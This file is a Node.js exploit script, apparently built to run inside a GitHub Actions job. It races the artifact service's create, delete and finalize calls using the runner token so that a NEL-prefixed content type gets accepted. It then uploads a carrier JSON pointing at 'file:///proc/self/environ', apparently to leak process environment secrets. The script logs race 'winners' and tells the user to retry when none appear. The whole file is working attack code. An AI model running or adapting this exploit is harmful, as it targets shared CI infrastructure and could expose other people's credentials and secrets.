const https = require('https');
const crypto = require('crypto');

const resultsUrl = process.env.ACTIONS_RESULTS_URL;
const token = process.env.ACTIONS_RUNTIME_TOKEN;
const runId = process.env.GITHUB_RUN_ID;
const repo = process.env.GITHUB_REPOSITORY;

const NEL_CT = '\u0085application/json';
const CLEAN_CT = 'application/json';

function twirpPost(endpoint, body) {
  const url = new URL(endpoint, resultsUrl);
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(body);
    const req = https.request(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token,
        'Content-Length': Buffer.byteLength(data),
      },
    }, (res) => {
      let buf = '';
      res.on('data', d => buf += d);
      res.on('end', () => {
        try { resolve(JSON.parse(buf)); } catch { resolve(buf); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function azurePut(signedUrl, data, contentType) {
  const url = new URL(signedUrl);
  return new Promise((resolve, reject) => {
    const req = https.request(url, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/octet-stream',
        'Content-Length': data.length,
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': contentType,
      },
    }, (res) => {
      let buf = '';
      res.on('data', d => buf += d);
      res.on('end', () => resolve({ status: res.statusCode, body: buf }));
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

const jwt = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
const scope = (jwt.scp || '').split(' ').find(s => s.startsWith('Actions.Results:'));
const scopeParts = scope ? scope.split(':') : [];
const wfRunId = scopeParts[1] || '';
const wfJobRunId = scopeParts[2] || '';

const base = {
  workflowRunBackendId: wfRunId,
  workflowJobRunBackendId: wfJobRunId,
};

async function createArtifact(name, version, mimeType) {
  try {
    const resp = await twirpPost(
      '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
      { ...base, name, version, mimeType }
    );
    return { ok: !!resp.ok, url: resp.signed_upload_url || resp.signedUploadUrl, resp };
  } catch (e) {
    return { ok: false, error: String(e).slice(0, 160) };
  }
}

async function deleteArtifact(name) {
  try {
    const resp = await twirpPost(
      '/twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact',
      { ...base, name }
    );
    return { ok: !!resp.ok, resp };
  } catch (e) {
    return { ok: false, error: String(e).slice(0, 160) };
  }
}

async function finalizeArtifact(name, size, hash) {
  try {
    const resp = await twirpPost(
      '/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
      { ...base, name, size: String(size), hash }
    );
    return { ok: !!resp.ok, id: resp.artifact_id || resp.artifactId, resp };
  } catch (e) {
    return { ok: false, error: String(e).slice(0, 160) };
  }
}

async function getSignedURL(name) {
  try {
    const resp = await twirpPost(
      '/twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL',
      { ...base, name }
    );
    const signedUrl = resp.signed_url || resp.signedUrl;
    const rsct = signedUrl ? new URL(signedUrl).searchParams.get('rsct') : null;
    return { ok: !!signedUrl, rsct, signedUrl };
  } catch (e) {
    return { ok: false, error: String(e).slice(0, 160) };
  }
}

async function upload(url, data, ct) {
  if (!url) return false;
  try {
    const r = await azurePut(url, data, ct || NEL_CT);
    return r.status < 400;
  } catch { return false; }
}

const placeholder = Buffer.from('{"probe":"race-test"}');
const placeholderHash = 'sha256:' + crypto.createHash('sha256').update(placeholder).digest('hex');

async function putCarrier(urls, id) {
  const repository = `${repo}/actions/artifacts/${id}/zip`;
  const payload = Buffer.from(JSON.stringify({
    full_name: repository,
    owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
    description: 'Repo Cassette race carrier',
    stargazers_count: 0,
  }));
  const hash = 'sha256:' + crypto.createHash('sha256').update(payload).digest('hex');
  for (const url of urls.filter(Boolean)) {
    try { await azurePut(url, payload, NEL_CT); } catch {}
  }
  return { repository, payload, hash };
}

async function pendingTrial(index, firstVersion) {
  const name = `repo-cassette-pending-${runId}-${firstVersion}-${index}`;
  const first = await createArtifact(name, firstVersion,
    firstVersion === 7 ? CLEAN_CT : NEL_CT);
  await upload(first.url, placeholder);
  const deleted = await deleteArtifact(name);
  const second = await createArtifact(name, firstVersion === 7 ? 6 : 7,
    firstVersion === 7 ? NEL_CT : CLEAN_CT);
  await upload(second.url, placeholder);
  const final = await finalizeArtifact(name, placeholder.length, placeholderHash);
  const view = await getSignedURL(name);
  const row = { kind: 'pending', index, firstVersion, first: first.ok, deleted: deleted.ok,
    second: second.ok, final: final.ok, finalId: final.id, rsct: view.rsct };

  if (view.rsct && view.rsct.includes('\u0085') && final.id) {
    const carrier = await putCarrier([first.url, second.url], final.id);
    row.WINNER = true;
    row.repository = carrier.repository;
    console.log('WINNER ' + JSON.stringify(row));
  } else {
    console.log('trial ' + JSON.stringify(row));
  }
  return row;
}

async function finalizedTrial(index, firstVersion, delay) {
  const name = `repo-cassette-fin-${runId}-${firstVersion}-${delay + 30}-${index}`;
  const first = await createArtifact(name, firstVersion,
    firstVersion === 7 ? CLEAN_CT : NEL_CT);
  await upload(first.url, placeholder);
  const oldFinal = await finalizeArtifact(name, placeholder.length, placeholderHash);

  let deletePromise, createPromise;
  if (delay < 0) {
    deletePromise = deleteArtifact(name);
    await sleep(-delay);
    createPromise = createArtifact(name, firstVersion === 7 ? 6 : 7,
      firstVersion === 7 ? NEL_CT : CLEAN_CT);
  } else {
    createPromise = createArtifact(name, firstVersion === 7 ? 6 : 7,
      firstVersion === 7 ? NEL_CT : CLEAN_CT);
    await sleep(delay);
    deletePromise = deleteArtifact(name);
  }
  const [deleted, second] = await Promise.all([deletePromise, createPromise]);
  await upload(second.url, placeholder);
  const final = await finalizeArtifact(name, placeholder.length, placeholderHash);
  const view = await getSignedURL(name);
  const row = { kind: 'finalized', index, firstVersion, delay,
    first: first.ok, oldFinal: oldFinal.ok, oldFinalId: oldFinal.id,
    deleted: deleted.ok, second: second.ok, final: final.ok, finalId: final.id,
    rsct: view.rsct };

  if (view.rsct && view.rsct.includes('\u0085') && (final.id || oldFinal.id)) {
    const id = final.id || oldFinal.id;
    const carrier = await putCarrier([first.url, second.url], id);
    row.WINNER = true;
    row.repository = carrier.repository;
    console.log('WINNER ' + JSON.stringify(row));
  } else {
    console.log('trial ' + JSON.stringify(row));
  }
  return row;
}

(async () => {
  console.log('Backend IDs:', wfRunId, '/', wfJobRunId);
  console.log('NEL CT hex:', Buffer.from(NEL_CT).toString('hex'));
  console.log('Repo:', repo, 'Run:', runId);

  const trials = [];
  for (let i = 0; i < 8; i++) {
    trials.push(() => pendingTrial(i, i % 2 ? 7 : 6));
    for (const delay of [-20, 0, 20]) {
      trials.push(() => finalizedTrial(i, i % 2 ? 7 : 6, delay));
    }
  }

  const rows = [];
  for (let i = 0; i < trials.length; i += 8) {
    const batch = trials.slice(i, i + 8).map(fn => fn());
    rows.push(...await Promise.all(batch));
  }

  const winners = rows.filter(r => r.WINNER);
  const summary = {
    total: rows.length,
    winners: winners.length,
    nelCount: rows.filter(r => r.rsct && r.rsct.includes('\u0085')).length,
    jsonCount: rows.filter(r => r.rsct === 'application/json').length,
    zipCount: rows.filter(r => r.rsct === 'application/zip').length,
    missingCount: rows.filter(r => !r.rsct).length,
  };
  console.log('SUMMARY ' + JSON.stringify(summary));

  if (winners.length === 0) {
    console.log('::warning::No race winners in this run. Try again.');
  }
})().catch(e => { console.error(e); process.exit(1); });
